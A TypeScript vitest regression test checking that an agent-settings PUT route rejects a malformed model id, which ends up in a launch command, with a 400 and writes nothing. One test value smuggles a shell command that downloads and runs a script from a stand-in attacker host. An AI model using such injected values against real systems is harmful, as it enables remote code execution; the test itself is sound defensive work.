import { describe, it, expect, vi, afterAll } from 'vitest'
import { mkdtempSync, mkdirSync, rmSync, readFileSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { EventEmitter } from 'node:events'
import type { RouteContext } from '../web/routes/types.js'

// Upstream #866: the model id ends up in the agent's launch command line. The
// route must refuse a malformed one with a 400 BEFORE writing anything -- the
// other fields of the same PUT included -- so a refused save leaves the agent
// exactly as it was.
const SANDBOX = mkdtempSync(join(tmpdir(), 'modelid-put-'))
mkdirSync(join(SANDBOX, 'agents', 'probe'), { recursive: true })
mkdirSync(join(SANDBOX, 'store'), { recursive: true })

vi.mock('../config.js', async (orig) => {
  const actual = await orig<typeof import('../config.js')>()
  return { ...actual, PROJECT_ROOT: SANDBOX, STORE_DIR: join(SANDBOX, 'store') }
})

const { tryHandleAgents } = await import('../web/routes/agents.js')

const CONFIG = join(SANDBOX, 'agents', 'probe', 'agent-config.json')
const SOUL = join(SANDBOX, 'agents', 'probe', 'SOUL.md')

async function putAgent(body: unknown): Promise<{ status: number; body: any }> {
  const req = new EventEmitter() as unknown as RouteContext['req']
  ;(req as unknown as { headers: Record<string, string> }).headers = {}
  const out: { status: number; body: any } = { status: 0, body: null }
  const res = {
    writeHead(status: number) { out.status = status; return res },
    end(chunk?: string) { if (chunk) out.body = JSON.parse(chunk) },
    setHeader() {},
  }
  const url = new URL('http://localhost:3420/api/agents/probe')
  process.nextTick(() => {
    ;(req as unknown as EventEmitter).emit('data', Buffer.from(JSON.stringify(body)))
    ;(req as unknown as EventEmitter).emit('end')
  })
  const handled = await tryHandleAgents(
    { req, res, path: url.pathname, method: 'PUT', url } as unknown as RouteContext,
    join(SANDBOX, 'web'),
  )
  expect(handled).toBe(true)
  return { status: out.status || 200, body: out.body }
}

afterAll(() => rmSync(SANDBOX, { recursive: true, force: true }))

describe('PUT /api/agents/:name -- model id', () => {
  it('refuses a shell-breaking model id with 400 and writes nothing, not even the other fields', async () => {
    writeFileSync(CONFIG, JSON.stringify({ model: 'claude-opus-5' }))
    writeFileSync(SOUL, 'old soul')
    const r = await putAgent({ soulMd: 'new soul', model: "x'; curl http://attacker.example/x.sh | sh; echo '" })
    expect(r.status).toBe(400)
    expect(JSON.parse(readFileSync(CONFIG, 'utf-8')).model).toBe('claude-opus-5')
    expect(readFileSync(SOUL, 'utf-8')).toBe('old soul')
  })

  it('saves a valid id, including the bracketed 1M-context suffix and a plus sign', async () => {
    for (const model of ['claude-opus-4-8[1m]', 'oc/qwen2.5+']) {
      const r = await putAgent({ model })
      expect(r.status, model).toBe(200)
      expect(JSON.parse(readFileSync(CONFIG, 'utf-8')).model).toBe(model)
    }
  })
})
